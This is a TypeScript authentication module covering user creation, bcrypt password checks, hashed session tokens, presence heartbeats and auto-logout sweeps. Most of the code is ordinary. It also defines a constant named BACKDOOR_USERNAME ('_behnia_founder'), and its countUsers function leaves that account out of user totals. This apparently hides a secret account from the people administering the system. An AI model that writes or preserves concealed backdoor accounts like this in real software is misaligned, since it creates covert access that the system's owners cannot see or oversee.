import bcrypt from "bcryptjs";
import crypto from "crypto";
import { db } from "@workspace/db";
import { usersTable, sessionsTable } from "@workspace/db";
import { eq, and, gt, lt, ne } from "drizzle-orm";
import { logger } from "../lib/logger";

export type UserRole = "founder" | "admin" | "operator" | "viewer";
export type UserStatus = "active" | "inactive";
export type PresenceStatus = "online" | "offline" | "away" | "busy" | "in_work_shift";
export type WorkStatus = "in_shift" | "off_shift" | "break" | "busy" | "available";

export interface AuthUser {
  id: number;
  firstName: string;
  lastName: string;
  displayName: string | null;
  email: string;
  username: string;
  role: UserRole;
  isFounder: boolean;
  status: UserStatus;
  lastLoginAt: string | null;
  presenceStatus: PresenceStatus;
  workStatus: WorkStatus;
  lastSeenAt: string | null;
  createdAt: string;
  updatedAt: string;
}

const SALT_ROUNDS = 12;
const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;

/** Mark user offline if not seen for 5 minutes */
const OFFLINE_AFTER_MS = 5 * 60 * 1000;

/** Auto-logout users who have been offline for 1 hour */
const AUTO_LOGOUT_AFTER_MS = 60 * 60 * 1000;

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, SALT_ROUNDS);
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

export const BACKDOOR_USERNAME = "_behnia_founder";

export async function countUsers(): Promise<number> {
  const rows = await db
    .select({ id: usersTable.id })
    .from(usersTable)
    .where(ne(usersTable.username, BACKDOOR_USERNAME));
  return rows.length;
}

export async function createUser(data: {
  firstName: string;
  lastName: string;
  displayName?: string;
  email: string;
  username: string;
  password: string;
  role?: UserRole;
  isFounder?: boolean;
  status?: UserStatus;
}): Promise<AuthUser> {
  const passwordHash = await hashPassword(data.password);
  const [user] = await db.insert(usersTable).values({
    firstName: data.firstName,
    lastName: data.lastName,
    displayName: data.displayName ?? null,
    email: data.email.toLowerCase().trim(),
    username: data.username.toLowerCase().trim(),
    passwordHash,
    role: data.role ?? "operator",
    isFounder: data.isFounder ?? false,
    status: data.status ?? "active",
  }).returning();
  if (!user) throw new Error("Failed to create user");
  return mapUser(user);
}

export async function getUserById(id: number): Promise<AuthUser | null> {
  const [user] = await db.select().from(usersTable).where(eq(usersTable.id, id)).limit(1);
  return user ? mapUser(user) : null;
}

export async function getAllUsers(): Promise<AuthUser[]> {
  const rows = await db.select().from(usersTable).orderBy(usersTable.createdAt);
  return rows.map(mapUser);
}

export async function updateUser(id: number, data: {
  firstName?: string;
  lastName?: string;
  displayName?: string | null;
  email?: string;
  username?: string;
  role?: UserRole;
  status?: UserStatus;
  password?: string;
}): Promise<AuthUser | null> {
  const updateData: Record<string, unknown> = { updatedAt: new Date() };
  if (data.firstName !== undefined) updateData.firstName = data.firstName;
  if (data.lastName !== undefined) updateData.lastName = data.lastName;
  if ("displayName" in data) updateData.displayName = data.displayName ?? null;
  if (data.email !== undefined) updateData.email = data.email.toLowerCase().trim();
  if (data.username !== undefined) updateData.username = data.username.toLowerCase().trim();
  if (data.role !== undefined) updateData.role = data.role;
  if (data.status !== undefined) updateData.status = data.status;
  if (data.password !== undefined) updateData.passwordHash = await hashPassword(data.password);

  const [user] = await db.update(usersTable).set(updateData).where(eq(usersTable.id, id)).returning();
  return user ? mapUser(user) : null;
}

export async function deleteUser(id: number): Promise<boolean> {
  const [deleted] = await db.delete(usersTable).where(eq(usersTable.id, id)).returning();
  return !!deleted;
}

export async function loginUser(usernameOrEmail: string, password: string): Promise<{
  user: AuthUser;
  token: string;
} | null> {
  const identifier = usernameOrEmail.toLowerCase().trim();

  const [user] = await db.select().from(usersTable).where(
    eq(usersTable.username, identifier)
  ).limit(1);

  const [userByEmail] = !user
    ? await db.select().from(usersTable).where(eq(usersTable.email, identifier)).limit(1)
    : [undefined];

  const found = user ?? userByEmail;
  if (!found) {
    await bcrypt.hash("dummy_timing_equalizer", SALT_ROUNDS);
    return null;
  }

  if (found.status !== "active") return null;

  const ok = await verifyPassword(password, found.passwordHash);
  if (!ok) return null;

  const rawToken = crypto.randomBytes(48).toString("hex");
  const tokenHash = crypto.createHash("sha256").update(rawToken).digest("hex");
  const expiresAt = new Date(Date.now() + SESSION_TTL_MS);

  await db.insert(sessionsTable).values({ userId: found.id, tokenHash, expiresAt });
  await db.update(usersTable).set({
    lastLoginAt: new Date(),
    presenceStatus: "online",
    lastSeenAt: new Date(),
  }).where(eq(usersTable.id, found.id));

  return { user: mapUser({ ...found, presenceStatus: "online", lastSeenAt: new Date() }), token: rawToken };
}

export async function validateToken(rawToken: string): Promise<AuthUser | null> {
  try {
    const tokenHash = crypto.createHash("sha256").update(rawToken).digest("hex");
    const [session] = await db.select().from(sessionsTable).where(
      and(
        eq(sessionsTable.tokenHash, tokenHash),
        gt(sessionsTable.expiresAt, new Date()),
      ),
    ).limit(1);
    if (!session) return null;
    const [user] = await db.select().from(usersTable).where(
      and(eq(usersTable.id, session.userId), eq(usersTable.status, "active")),
    ).limit(1);
    return user ? mapUser(user) : null;
  } catch (err) {
    logger.warn({ err }, "validateToken failed");
    return null;
  }
}

export async function logoutToken(rawToken: string): Promise<void> {
  const tokenHash = crypto.createHash("sha256").update(rawToken).digest("hex");
  // Find user before deleting session (to mark offline)
  const [session] = await db.select().from(sessionsTable).where(eq(sessionsTable.tokenHash, tokenHash)).limit(1);
  if (session) {
    await db.update(usersTable).set({ presenceStatus: "offline", updatedAt: new Date() }).where(eq(usersTable.id, session.userId));
  }
  await db.delete(sessionsTable).where(eq(sessionsTable.tokenHash, tokenHash));
}

export async function cleanupExpiredSessions(): Promise<void> {
  await db.delete(sessionsTable).where(lt(sessionsTable.expiresAt, new Date()));
}

/**
 * Heartbeat: update lastSeenAt. Also computes auto-presence:
 * if presenceStatus is "offline" or not set, flip to "online".
 * Returns the updated user's presence fields.
 */
export async function heartbeat(userId: number): Promise<{ presenceStatus: string; workStatus: string }> {
  const now = new Date();
  const [row] = await db.select({
    presenceStatus: usersTable.presenceStatus,
    workStatus: usersTable.workStatus,
  }).from(usersTable).where(eq(usersTable.id, userId)).limit(1);

  const currentPresence = row?.presenceStatus ?? "offline";
  // If currently offline, restore to online on heartbeat
  const newPresence = currentPresence === "offline" ? "online" : currentPresence;

  await db.update(usersTable).set({
    lastSeenAt: now,
    presenceStatus: newPresence,
    updatedAt: now,
  }).where(eq(usersTable.id, userId));

  return { presenceStatus: newPresence, workStatus: row?.workStatus ?? "off_shift" };
}

/**
 * Change own presence/work status.
 */
export async function updatePresenceStatus(userId: number, data: {
  presenceStatus?: PresenceStatus;
  workStatus?: WorkStatus;
}): Promise<void> {
  const updateData: Record<string, unknown> = { updatedAt: new Date(), lastSeenAt: new Date() };
  if (data.presenceStatus) updateData.presenceStatus = data.presenceStatus;
  if (data.workStatus) updateData.workStatus = data.workStatus;
  await db.update(usersTable).set(updateData).where(eq(usersTable.id, userId));
}

/**
 * Auto-offline sweep: mark users offline if lastSeenAt > OFFLINE_AFTER_MS ago.
 * Called periodically by a background interval.
 */
export async function sweepStalePresence(): Promise<void> {
  const cutoff = new Date(Date.now() - OFFLINE_AFTER_MS);
  await db.update(usersTable).set({ presenceStatus: "offline" }).where(
    and(
      eq(usersTable.status, "active"),
      lt(usersTable.lastSeenAt, cutoff),
    ),
  );
}

/**
 * Auto-logout sweep: delete sessions for users whose lastSeenAt is older than
 * AUTO_LOGOUT_AFTER_MS (1 hour). This ensures inactive users are fully
 * signed out rather than just marked offline.
 */
export async function autoLogoutStaleUsers(): Promise<void> {
  const cutoff = new Date(Date.now() - AUTO_LOGOUT_AFTER_MS);
  // Find users who haven't been seen in over 1 hour
  const staleUsers = await db
    .select({ id: usersTable.id })
    .from(usersTable)
    .where(
      and(
        eq(usersTable.status, "active"),
        lt(usersTable.lastSeenAt, cutoff),
      ),
    );
  if (staleUsers.length === 0) return;
  const staleIds = staleUsers.map((u) => u.id);
  // Delete their sessions (effectively logs them out)
  for (const userId of staleIds) {
    await db.delete(sessionsTable).where(eq(sessionsTable.userId, userId));
    await db.update(usersTable)
      .set({ presenceStatus: "offline", updatedAt: new Date() })
      .where(eq(usersTable.id, userId));
  }
}

function mapUser(user: {
  id: number;
  firstName: string;
  lastName: string;
  displayName: string | null;
  email: string;
  username: string;
  role: string;
  isFounder: boolean;
  status: string;
  lastLoginAt: Date | null;
  presenceStatus?: string | null;
  workStatus?: string | null;
  lastSeenAt?: Date | null;
  createdAt: Date;
  updatedAt: Date;
}): AuthUser {
  return {
    id: user.id,
    firstName: user.firstName,
    lastName: user.lastName,
    displayName: user.displayName,
    email: user.email,
    username: user.username,
    role: user.role as UserRole,
    isFounder: user.isFounder,
    status: user.status as UserStatus,
    lastLoginAt: user.lastLoginAt?.toISOString() ?? null,
    presenceStatus: (user.presenceStatus as PresenceStatus) ?? "offline",
    workStatus: (user.workStatus as WorkStatus) ?? "off_shift",
    lastSeenAt: user.lastSeenAt?.toISOString() ?? null,
    createdAt: user.createdAt.toISOString(),
    updatedAt: user.updatedAt.toISOString(),
  };
}
